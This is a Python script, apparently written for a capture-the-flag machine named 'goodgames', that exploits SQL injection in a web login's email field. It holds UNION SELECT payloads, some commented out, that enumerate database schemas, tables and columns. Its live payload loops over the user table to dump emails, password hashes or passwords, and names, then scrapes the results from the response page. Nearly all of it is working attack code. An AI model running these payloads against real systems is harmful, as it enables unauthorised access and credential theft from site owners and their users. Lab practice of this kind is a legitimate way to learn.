#!/usr/bin/python3


import requests
import sys
import re
from pwn import *

# for the machine goodgames
# we can include the sqli 
# implementing a simple script with Python and enumerating all the tables
def enumerating_info(url):

    for i in range(0, 100):
        data_send = {
                # "email":"admin' union select 1,2,3,4-- -",
                # "email":"admin' union select 1,2,3,schema_name from information_schema.schemata-- -",
                # "email":f"admin' union select 1,2,3,table_name from information_schema.tables where table_schema='main' limit {i},1-- -",
                
                # "email":f"admin' union select 1,2,3,column_name from information_schema.columns where table_schema='main' and table_name='user' limit {i},1-- -",
                # with this payload, we get the id, username and password
                
                
                "email":f"admin' union select 1,2,3,group_concat(email,0x3a,password,0x3a,name) from user limit {i},1-- -",
                "password":"weherever :v"
        }

        ress = requests.post(url=url+"login", data=data_send)
        # print(ress.text)
        welcome_ress = re.findall(r'<h2 class="h4">(.*?)<\/h2>', ress.text)
        # if welcome_ress != "Internal server error!":
        print(f"For the iteration {i}-1", welcome_ress[0])




def main():

    try:
        url = sys.argv[1]

        enumerating_info(url)

    except Exception as e:
        log.failure(f"{str(e)}")
        exit(1)

    except KeyboardInterrupt:
        exit(0)



if __name__ == "__main__":
    main()
